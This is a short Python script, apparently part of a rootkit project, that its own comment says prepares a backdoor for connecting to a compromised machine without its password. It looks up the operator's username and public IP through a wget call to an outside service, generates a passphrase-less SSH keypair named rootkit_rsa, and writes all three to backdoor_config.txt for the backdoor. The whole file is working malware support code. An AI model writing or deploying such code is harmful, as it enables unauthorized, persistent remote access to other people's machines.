#This file is used to automatically find information needed for the current user to connect to a comprimised machine through the associated rootkit, without the need to know their password. 

import getpass
import os

#finds the current user's username
username = getpass.getuser()

#finds the current user's network's public ip address
stream = os.popen('wget -qO- http://ipecho.net/plain | xargs echo')
public_ip = stream.read()
public_ip = public_ip[:-1]

#generate a new ssh rsa keypair
os.system("ssh-keygen -t rsa -N '' -f rootkit_rsa")

##get's the users public rsa ssh key
ssh_key_file = open(os.path.expanduser("rootkit_rsa.pub"), "r")
ssh_key = ssh_key_file.read()
ssh_key_file.close()

#create new file to write parameters to. each input on new line in order of 1)public ssh key, 2)username, 3)public ip address
file = open("backdoor_config.txt", "w")
file.write(ssh_key)
file.write(username + '\n')
file.write(public_ip)
file.close()
